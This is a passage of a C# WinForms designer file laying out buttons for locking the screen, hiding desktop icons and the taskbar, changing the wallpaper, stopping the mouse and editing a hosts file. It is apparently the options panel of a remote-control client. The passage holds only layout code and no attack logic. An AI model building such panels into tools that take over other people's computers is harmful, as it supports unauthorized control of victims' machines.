        this.MouseStop.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.MouseStop.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.MouseStop.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.MouseStop.ForeColor = System.Drawing.Color.White;
        this.MouseStop.HoverState.Parent = this.MouseStop;
        this.MouseStop.Location = new System.Drawing.Point(13, 367);
        this.MouseStop.Name = "MouseStop";
        this.MouseStop.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.MouseStop.PressedDepth = 50;
        this.MouseStop.ShadowDecoration.Parent = this.MouseStop;
        this.MouseStop.Size = new System.Drawing.Size(96, 26);
        this.MouseStop.TabIndex = 743;
        this.MouseStop.Text = "Stop";
        this.MouseStop.Click += new System.EventHandler(MouseStop_Click);
        this.ChagneBackgroundDesktop.BackColor = System.Drawing.Color.White;
        this.ChagneBackgroundDesktop.BorderRadius = 4;
        this.ChagneBackgroundDesktop.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.ChagneBackgroundDesktop.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.ChagneBackgroundDesktop.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.ChagneBackgroundDesktop.CheckedState.Parent = this.ChagneBackgroundDesktop;
        this.ChagneBackgroundDesktop.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ChagneBackgroundDesktop.CustomImages.Parent = this.ChagneBackgroundDesktop;
        this.ChagneBackgroundDesktop.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ChagneBackgroundDesktop.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ChagneBackgroundDesktop.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.ChagneBackgroundDesktop.ForeColor = System.Drawing.Color.White;
        this.ChagneBackgroundDesktop.HoverState.Parent = this.ChagneBackgroundDesktop;
        this.ChagneBackgroundDesktop.Location = new System.Drawing.Point(13, 135);
        this.ChagneBackgroundDesktop.Name = "ChagneBackgroundDesktop";
        this.ChagneBackgroundDesktop.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.ChagneBackgroundDesktop.PressedDepth = 50;
        this.ChagneBackgroundDesktop.ShadowDecoration.Parent = this.ChagneBackgroundDesktop;
        this.ChagneBackgroundDesktop.Size = new System.Drawing.Size(198, 26);
        this.ChagneBackgroundDesktop.TabIndex = 742;
        this.ChagneBackgroundDesktop.Text = "Desktop Background";
        this.ChagneBackgroundDesktop.Click += new System.EventHandler(ChagneBackgroundDesktop_Click);
        this.ShowTaskbar.BackColor = System.Drawing.Color.White;
        this.ShowTaskbar.BorderRadius = 4;
        this.ShowTaskbar.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.ShowTaskbar.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.ShowTaskbar.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.ShowTaskbar.CheckedState.Parent = this.ShowTaskbar;
        this.ShowTaskbar.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ShowTaskbar.CustomImages.Parent = this.ShowTaskbar;
        this.ShowTaskbar.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ShowTaskbar.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ShowTaskbar.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.ShowTaskbar.ForeColor = System.Drawing.Color.White;
        this.ShowTaskbar.HoverState.Parent = this.ShowTaskbar;
        this.ShowTaskbar.Location = new System.Drawing.Point(13, 222);
        this.ShowTaskbar.Name = "ShowTaskbar";
        this.ShowTaskbar.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.ShowTaskbar.PressedDepth = 50;
        this.ShowTaskbar.ShadowDecoration.Parent = this.ShowTaskbar;
        this.ShowTaskbar.Size = new System.Drawing.Size(198, 26);
        this.ShowTaskbar.TabIndex = 740;
        this.ShowTaskbar.Text = "Show";
        this.ShowTaskbar.Click += new System.EventHandler(ShowTaskbar_Click);
        this.guna2HtmlLabel4.BackColor = System.Drawing.Color.White;
        this.guna2HtmlLabel4.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.guna2HtmlLabel4.ForeColor = System.Drawing.Color.Black;
        this.guna2HtmlLabel4.Location = new System.Drawing.Point(13, 167);
        this.guna2HtmlLabel4.Name = "guna2HtmlLabel4";
        this.guna2HtmlLabel4.Size = new System.Drawing.Size(94, 17);
        this.guna2HtmlLabel4.TabIndex = 738;
        this.guna2HtmlLabel4.Text = "Taskbar Settings :";
        this.HideTaskBar.BackColor = System.Drawing.Color.White;
        this.HideTaskBar.BorderRadius = 4;
        this.HideTaskBar.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.HideTaskBar.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.HideTaskBar.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.HideTaskBar.CheckedState.Parent = this.HideTaskBar;
        this.HideTaskBar.Cursor = System.Windows.Forms.Cursors.Hand;
        this.HideTaskBar.CustomImages.Parent = this.HideTaskBar;
        this.HideTaskBar.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.HideTaskBar.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.HideTaskBar.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.HideTaskBar.ForeColor = System.Drawing.Color.White;
        this.HideTaskBar.HoverState.Parent = this.HideTaskBar;
        this.HideTaskBar.Location = new System.Drawing.Point(13, 190);
        this.HideTaskBar.Name = "HideTaskBar";
        this.HideTaskBar.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.HideTaskBar.PressedDepth = 50;
        this.HideTaskBar.ShadowDecoration.Parent = this.HideTaskBar;
        this.HideTaskBar.Size = new System.Drawing.Size(198, 26);
        this.HideTaskBar.TabIndex = 737;
        this.HideTaskBar.Text = "Hide";
        this.HideTaskBar.Click += new System.EventHandler(HideTaskBar_Click);
        this.UnlockScreen.BackColor = System.Drawing.Color.White;
        this.UnlockScreen.BorderRadius = 4;
        this.UnlockScreen.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.UnlockScreen.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.UnlockScreen.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.UnlockScreen.CheckedState.Parent = this.UnlockScreen;
        this.UnlockScreen.Cursor = System.Windows.Forms.Cursors.Hand;
        this.UnlockScreen.CustomImages.Parent = this.UnlockScreen;
        this.UnlockScreen.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.UnlockScreen.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.UnlockScreen.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.UnlockScreen.ForeColor = System.Drawing.Color.White;
        this.UnlockScreen.HoverState.Parent = this.UnlockScreen;
        this.UnlockScreen.Location = new System.Drawing.Point(115, 60);
        this.UnlockScreen.Name = "UnlockScreen";
        this.UnlockScreen.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.UnlockScreen.PressedDepth = 50;
        this.UnlockScreen.ShadowDecoration.Parent = this.UnlockScreen;
        this.UnlockScreen.Size = new System.Drawing.Size(96, 26);
        this.UnlockScreen.TabIndex = 736;
        this.UnlockScreen.Text = "Unloack";
        this.UnlockScreen.Click += new System.EventHandler(UnlockScreen_Click);
        this.ImageIndex.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.ImageIndex.Image = (System.Drawing.Image)resources.GetObject("ImageIndex.Image");
        this.ImageIndex.Location = new System.Drawing.Point(217, 60);
        this.ImageIndex.Name = "ImageIndex";
        this.ImageIndex.Size = new System.Drawing.Size(517, 230);
        this.ImageIndex.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.ImageIndex.TabIndex = 735;
        this.ImageIndex.TabStop = false;
        this.ShowIconDesktop.BackColor = System.Drawing.Color.White;
        this.ShowIconDesktop.BorderRadius = 4;
        this.ShowIconDesktop.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.ShowIconDesktop.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.ShowIconDesktop.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.ShowIconDesktop.CheckedState.Parent = this.ShowIconDesktop;
        this.ShowIconDesktop.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ShowIconDesktop.CustomImages.Parent = this.ShowIconDesktop;
        this.ShowIconDesktop.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ShowIconDesktop.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ShowIconDesktop.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.ShowIconDesktop.ForeColor = System.Drawing.Color.White;
        this.ShowIconDesktop.HoverState.Parent = this.ShowIconDesktop;
        this.ShowIconDesktop.Location = new System.Drawing.Point(115, 100);
        this.ShowIconDesktop.Name = "ShowIconDesktop";
        this.ShowIconDesktop.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.ShowIconDesktop.PressedDepth = 50;
        this.ShowIconDesktop.ShadowDecoration.Parent = this.ShowIconDesktop;
        this.ShowIconDesktop.Size = new System.Drawing.Size(96, 26);
        this.ShowIconDesktop.TabIndex = 725;
        this.ShowIconDesktop.Text = "Icon Show";
        this.ShowIconDesktop.Click += new System.EventHandler(ShowIconDesktop_Click);
        this.LockedScreen.BackColor = System.Drawing.Color.White;
        this.LockedScreen.BorderRadius = 4;
        this.LockedScreen.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.LockedScreen.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.LockedScreen.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.LockedScreen.CheckedState.Parent = this.LockedScreen;
        this.LockedScreen.Cursor = System.Windows.Forms.Cursors.Hand;
        this.LockedScreen.CustomImages.Parent = this.LockedScreen;
        this.LockedScreen.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.LockedScreen.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.LockedScreen.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.LockedScreen.ForeColor = System.Drawing.Color.White;
        this.LockedScreen.HoverState.Parent = this.LockedScreen;
        this.LockedScreen.Location = new System.Drawing.Point(13, 60);
        this.LockedScreen.Name = "LockedScreen";
        this.LockedScreen.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.LockedScreen.PressedDepth = 50;
        this.LockedScreen.ShadowDecoration.Parent = this.LockedScreen;
        this.LockedScreen.Size = new System.Drawing.Size(96, 26);
        this.LockedScreen.TabIndex = 724;
        this.LockedScreen.Text = "Locked";
        this.LockedScreen.Click += new System.EventHandler(LockedScreen_Click);
        this.guna2HtmlLabel9.BackColor = System.Drawing.Color.White;
        this.guna2HtmlLabel9.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.guna2HtmlLabel9.ForeColor = System.Drawing.Color.Black;
        this.guna2HtmlLabel9.Location = new System.Drawing.Point(13, 28);
        this.guna2HtmlLabel9.Name = "guna2HtmlLabel9";
        this.guna2HtmlLabel9.Size = new System.Drawing.Size(97, 17);
        this.guna2HtmlLabel9.TabIndex = 723;
        this.guna2HtmlLabel9.Text = "Desktop Settings :";
        this.HideIconDesktop.BackColor = System.Drawing.Color.White;
        this.HideIconDesktop.BorderRadius = 4;
        this.HideIconDesktop.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.HideIconDesktop.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.HideIconDesktop.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.HideIconDesktop.CheckedState.Parent = this.HideIconDesktop;
        this.HideIconDesktop.Cursor = System.Windows.Forms.Cursors.Hand;
        this.HideIconDesktop.CustomImages.Parent = this.HideIconDesktop;
        this.HideIconDesktop.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.HideIconDesktop.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.HideIconDesktop.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.HideIconDesktop.ForeColor = System.Drawing.Color.White;
        this.HideIconDesktop.HoverState.Parent = this.HideIconDesktop;
        this.HideIconDesktop.Location = new System.Drawing.Point(13, 100);
        this.HideIconDesktop.Name = "HideIconDesktop";
        this.HideIconDesktop.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.HideIconDesktop.PressedDepth = 50;
        this.HideIconDesktop.ShadowDecoration.Parent = this.HideIconDesktop;
        this.HideIconDesktop.Size = new System.Drawing.Size(96, 26);
        this.HideIconDesktop.TabIndex = 722;
        this.HideIconDesktop.Text = "Icon Hide";
        this.HideIconDesktop.Click += new System.EventHandler(HideIconDesktop_Click);
        this.PageHosts.Controls.Add(this.toolStrip5);
        this.PageHosts.Controls.Add(this.TextHosts);
        this.PageHosts.Location = new System.Drawing.Point(4, 4);
        this.PageHosts.Name = "PageHosts";
        this.PageHosts.Size = new System.Drawing.Size(741, 416);
        this.PageHosts.TabIndex = 7;
        this.PageHosts.Text = "PageHosts";
        this.PageHosts.UseVisualStyleBackColor = true;
        this.toolStrip5.ImageScalingSize = new System.Drawing.Size(24, 24);
        this.toolStrip5.Items.AddRange(new System.Windows.Forms.ToolStripItem[6] { this.toolStripSeparator6, this.SaveHosts, this.toolStripSeparator7, this.RefreshHosts, this.toolStripSeparator_0, this.LogsHosts });
        this.toolStrip5.Location = new System.Drawing.Point(0, 0);
        this.toolStrip5.Name = "toolStrip5";
        this.toolStrip5.Size = new System.Drawing.Size(741, 25);
        this.toolStrip5.TabIndex = 9;
        this.toolStrip5.Text = "toolStrip5";
        this.toolStripSeparator6.Name = "toolStripSeparator6";
        this.toolStripSeparator6.Size = new System.Drawing.Size(6, 25);
        this.SaveHosts.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
        this.SaveHosts.Image = (System.Drawing.Image)resources.GetObject("SaveHosts.Image");
        this.SaveHosts.ImageTransparentColor = System.Drawing.Color.Magenta;
        this.SaveHosts.Name = "SaveHosts";
        this.SaveHosts.Size = new System.Drawing.Size(35, 22);
        this.SaveHosts.Text = "Save";
        this.SaveHosts.Click += new System.EventHandler(SaveHosts_Click);
        this.toolStripSeparator7.Name = "toolStripSeparator7";
        this.toolStripSeparator7.Size = new System.Drawing.Size(6, 25);
        this.RefreshHosts.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
        this.RefreshHosts.Image = (System.Drawing.Image)resources.GetObject("RefreshHosts.Image");
        this.RefreshHosts.ImageTransparentColor = System.Drawing.Color.Magenta;
        this.RefreshHosts.Name = "RefreshHosts";
        this.RefreshHosts.Size = new System.Drawing.Size(50, 22);
        this.RefreshHosts.Text = "Refresh";
        this.RefreshHosts.Click += new System.EventHandler(RefreshHosts_Click);
        this.toolStripSeparator_0.Name = "toolStripSeparator10";
        this.toolStripSeparator_0.Size = new System.Drawing.Size(6, 25);
        this.LogsHosts.Name = "LogsHosts";
        this.LogsHosts.Size = new System.Drawing.Size(16, 22);
        this.LogsHosts.Text = "...";
        this.LogsHosts.Click += new System.EventHandler(LogsHosts_Click);
        this.TextHosts.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.TextHosts.BackColor = System.Drawing.Color.FromArgb(240, 240, 240);
        this.TextHosts.Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.TextHosts.Location = new System.Drawing.Point(3, 29);
        this.TextHosts.Name = "TextHosts";
        this.TextHosts.Size = new System.Drawing.Size(738, 387);
        this.TextHosts.TabIndex = 8;
        this.TextHosts.Tag = "";
        this.TextHosts.Text = "";
        this.FormResizeBox1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.FormResizeBox1.ForeColor = System.Drawing.Color.Empty;
        this.FormResizeBox1.Location = new System.Drawing.Point(805, 560);
        this.FormResizeBox1.Name = "FormResizeBox1";
        this.FormResizeBox1.Size = new System.Drawing.Size(20, 20);
        this.FormResizeBox1.TabIndex = 600;
        this.FormResizeBox1.TargetControl = this;
        this.PanelTitle.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelTitle.BackgroundColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.PanelTitle.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelTitle.BackgroundImage");
        this.PanelTitle.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelTitle.BorderColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.PanelTitle.BorderRadius = 22;
        this.PanelTitle.BorderThickness = 1;
        this.PanelTitle.Controls.Add(this.TitlePage);
        this.PanelTitle.Controls.Add(this.LoaderConnect);
        this.PanelTitle.Controls.Add(this.ButtClose);
        this.PanelTitle.Controls.Add(this.ButtionMinimized);
        this.PanelTitle.Controls.Add(this.ButtonMaximized);
        this.PanelTitle.Controls.Add(this.UserIdInfo);
        this.PanelTitle.Controls.Add(this.bunifuLabel1);
        this.PanelTitle.Controls.Add(this.ImageLogo);
        this.PanelTitle.Cursor = System.Windows.Forms.Cursors.SizeAll;
        this.PanelTitle.Location = new System.Drawing.Point(16, 22);
        this.PanelTitle.Name = "PanelTitle";
        this.PanelTitle.ShowBorders = true;
        this.PanelTitle.Size = new System.Drawing.Size(802, 77);
        this.PanelTitle.TabIndex = 596;
        this.TitlePage.AllowParentOverrides = false;
        this.TitlePage.AutoEllipsis = false;
        this.TitlePage.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.TitlePage.CursorType = null;
        this.TitlePage.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.TitlePage.ForeColor = System.Drawing.Color.DarkGray;
        this.TitlePage.Location = new System.Drawing.Point(132, 20);
        this.TitlePage.Name = "TitlePage";
        this.TitlePage.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.TitlePage.Size = new System.Drawing.Size(50, 15);
        this.TitlePage.TabIndex = 609;
        this.TitlePage.Text = "- Settings";
        this.TitlePage.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.TitlePage.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.LoaderConnect.AllowStylePresets = true;
        this.LoaderConnect.BackColor = System.Drawing.Color.Transparent;
        this.LoaderConnect.CapStyle = Bunifu.UI.WinForms.BunifuLoader.CapStyles.Flat;
        this.LoaderConnect.Color = System.Drawing.Color.FromArgb(87, 59, 255);
        this.LoaderConnect.Colors = new Bunifu.UI.WinForms.Bloom[0];
        this.LoaderConnect.Cursor = System.Windows.Forms.Cursors.Arrow;
        this.LoaderConnect.Customization = "";
        this.LoaderConnect.DashWidth = 0.5f;
        this.LoaderConnect.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.LoaderConnect.Image = null;
        this.LoaderConnect.Location = new System.Drawing.Point(12, 13);
        this.LoaderConnect.Name = "LoaderConnect";
        this.LoaderConnect.NoRounding = false;
        this.LoaderConnect.Preset = Bunifu.UI.WinForms.BunifuLoader.StylePresets.Dashed;
        this.LoaderConnect.RingStyle = Bunifu.UI.WinForms.BunifuLoader.RingStyles.Dashed;
        this.LoaderConnect.ShowText = false;
        this.LoaderConnect.Size = new System.Drawing.Size(57, 50);
        this.LoaderConnect.Speed = 7;
        this.LoaderConnect.TabIndex = 607;
        this.LoaderConnect.Text = "bunifuLoader1";
        this.LoaderConnect.TextPadding = new System.Windows.Forms.Padding(0);
        this.LoaderConnect.Thickness = 6;
        this.LoaderConnect.Transparent = true;
        this.LoaderConnect.Visible = false;
        this.ButtClose.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtClose.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtClose.CheckedState.Parent = this.ButtClose;
        this.ButtClose.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtClose.CustomImages.Parent = this.ButtClose;
        this.ButtClose.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtClose.ForeColor = System.Drawing.Color.White;
        this.ButtClose.HoverState.BorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.Parent = this.ButtClose;
        this.ButtClose.Location = new System.Drawing.Point(772, 13);
        this.ButtClose.Name = "ButtClose";
        this.ButtClose.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtClose.ShadowDecoration.Parent = this.ButtClose;
        this.ButtClose.Size = new System.Drawing.Size(17, 17);
        this.ButtClose.TabIndex = 573;
        this.ButtClose.Click += new System.EventHandler(ButtClose_Click);
        this.ButtionMinimized.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtionMinimized.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtionMinimized.CheckedState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtionMinimized.CustomImages.Parent = this.ButtionMinimized;
        this.ButtionMinimized.FillColor = System.Drawing.Color.FromArgb(97, 196, 83);
        this.ButtionMinimized.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtionMinimized.ForeColor = System.Drawing.Color.White;
        this.ButtionMinimized.HoverState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Location = new System.Drawing.Point(724, 13);
        this.ButtionMinimized.Name = "ButtionMinimized";
        this.ButtionMinimized.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtionMinimized.ShadowDecoration.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Size = new System.Drawing.Size(17, 17);
        this.ButtionMinimized.TabIndex = 575;
        this.ButtionMinimized.Click += new System.EventHandler(ButtionMinimized_Click);
        this.ButtonMaximized.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtonMaximized.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtonMaximized.CheckedState.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtonMaximized.CustomImages.Parent = this.ButtonMaximized;
        this.ButtonMaximized.FillColor = System.Drawing.Color.FromArgb(244, 190, 83);
        this.ButtonMaximized.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtonMaximized.ForeColor = System.Drawing.Color.White;
        this.ButtonMaximized.HoverState.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Location = new System.Drawing.Point(748, 13);
        this.ButtonMaximized.Name = "ButtonMaximized";
        this.ButtonMaximized.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtonMaximized.ShadowDecoration.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Size = new System.Drawing.Size(17, 17);
        this.ButtonMaximized.TabIndex = 574;
        this.ButtonMaximized.Click += new System.EventHandler(ButtonMaximized_Click);
        this.UserIdInfo.AllowParentOverrides = false;
        this.UserIdInfo.AutoEllipsis = false;
        this.UserIdInfo.Cursor = System.Windows.Forms.Cursors.Default;
        this.UserIdInfo.CursorType = System.Windows.Forms.Cursors.Default;
        this.UserIdInfo.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.UserIdInfo.ForeColor = System.Drawing.Color.DarkGray;
        this.UserIdInfo.Location = new System.Drawing.Point(75, 40);
        this.UserIdInfo.Name = "UserIdInfo";
        this.UserIdInfo.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.UserIdInfo.Size = new System.Drawing.Size(10, 15);
        this.UserIdInfo.TabIndex = 572;
        this.UserIdInfo.Text = "--";
        this.UserIdInfo.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.UserIdInfo.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.bunifuLabel1.AllowParentOverrides = false;
        this.bunifuLabel1.AutoEllipsis = false;
        this.bunifuLabel1.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.bunifuLabel1.ForeColor = System.Drawing.Color.Black;
        this.bunifuLabel1.Location = new System.Drawing.Point(75, 17);
        this.bunifuLabel1.Name = "bunifuLabel1";
        this.bunifuLabel1.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel1.Size = new System.Drawing.Size(48, 17);
        this.bunifuLabel1.TabIndex = 571;
        this.bunifuLabel1.Text = "Options";
        this.bunifuLabel1.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel1.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.ImageLogo.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ImageLogo.Image = (System.Drawing.Image)resources.GetObject("ImageLogo.Image");
        this.ImageLogo.Location = new System.Drawing.Point(10, 13);
        this.ImageLogo.Name = "ImageLogo";
        this.ImageLogo.Size = new System.Drawing.Size(59, 50);
        this.ImageLogo.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.ImageLogo.TabIndex = 570;
        this.ImageLogo.TabStop = false;
        this.PanelBottom.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelBottom.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelBottom.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelBottom.BackgroundImage");
        this.PanelBottom.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelBottom.BorderColor = System.Drawing.Color.White;
        this.PanelBottom.BorderRadius = 30;
        this.PanelBottom.BorderThickness = 1;
        this.PanelBottom.Location = new System.Drawing.Point(170, 575);
        this.PanelBottom.Name = "PanelBottom";
        this.PanelBottom.ShowBorders = true;
        this.PanelBottom.Size = new System.Drawing.Size(499, 25);
        this.PanelBottom.TabIndex = 594;
        this.PanelLeft.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
        this.PanelLeft.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelLeft.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelLeft.BackgroundImage");
        this.PanelLeft.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelLeft.BorderColor = System.Drawing.Color.White;
        this.PanelLeft.BorderRadius = 30;
        this.PanelLeft.BorderThickness = 1;
        this.PanelLeft.Location = new System.Drawing.Point(-16, 112);
        this.PanelLeft.Name = "PanelLeft";
        this.PanelLeft.ShowBorders = true;
        this.PanelLeft.Size = new System.Drawing.Size(25, 367);
        this.PanelLeft.TabIndex = 593;
        this.PanelTOP.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelTOP.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelTOP.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelTOP.BackgroundImage");
        this.PanelTOP.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelTOP.BorderColor = System.Drawing.Color.White;
        this.PanelTOP.BorderRadius = 30;
        this.PanelTOP.BorderThickness = 1;
        this.PanelTOP.Location = new System.Drawing.Point(170, -14);
        this.PanelTOP.Name = "PanelTOP";
        this.PanelTOP.ShowBorders = true;
        this.PanelTOP.Size = new System.Drawing.Size(499, 25);
        this.PanelTOP.TabIndex = 592;
        this.PanelRight.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.PanelRight.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelRight.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelRight.BackgroundImage");
        this.PanelRight.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelRight.BorderColor = System.Drawing.Color.White;
        this.PanelRight.BorderRadius = 30;
        this.PanelRight.BorderThickness = 1;
        this.PanelRight.Location = new System.Drawing.Point(822, 108);
        this.PanelRight.Name = "PanelRight";
        this.PanelRight.ShowBorders = true;
